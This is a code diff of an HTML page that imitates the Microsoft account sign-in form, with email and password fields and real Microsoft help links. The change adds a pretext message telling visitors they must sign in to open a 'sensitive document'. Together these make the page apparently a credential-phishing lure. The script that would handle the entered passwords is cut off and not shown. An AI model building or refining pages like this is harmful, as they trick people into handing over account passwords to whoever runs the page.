@@ -108,23 +108,32 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
         <i class="fas fa-arrow-left"></i>
         <input type="email" id="email" placeholder="@example.com"/>
       </div>
-    <div class="login-header">
-      <b>Enter password</b>
 
-      <input type="password" id="password" placeholder="Password" class="ms-pass-field"/>
+      <div class="login-header">
+        <!-- Write-up added here -->
+        <p style="margin-bottom: 10px; font-weight: normal;">
+          You are about to access a sensitive document, so you need to sign in.
+        </p>
+        </p>
+        </p>
+        </p>
+        <b>Enter password</b>
+        <input type="password" id="password" placeholder="Password" class="ms-pass-field"/>
 
-      <div class="ms-links">
-        <p>No account? <a href="https://signup.live.com/?lic=1">Create one</a></p>
-        <p><a href="https://support.microsoft.com/en-us/account-billing/reset-a-forgotten-microsoft-account-password-eff4f067-5042-c1a3-fe72-b04d60556c37">Can’t access your account?</a></p>
+        <div class="ms-links">
+          <p>No account? <a href="https://signup.live.com/?lic=1">Create one</a></p>
+          <p><a href="https://support.microsoft.com/en-us/account-billing/reset-a-forgotten-microsoft-account-password-eff4f067-5042-c1a3-fe72-b04d60556c37">Can’t access your account?</a></p>
+        </div>
+
+        <!-- ERROR MESSAGE -->
+        <div id="error-msg"></div>
+
+        <button id="login-btn" class="ms-next-btn">Next</button>
       </div>
-
-      <!-- ERROR MESSAGE -->
-      <div id="error-msg"></div>
-
-      <button id="login-btn" class="ms-next-btn">Next</button>
     </div>
   </div>
 </div>
+
 <script>
 
 
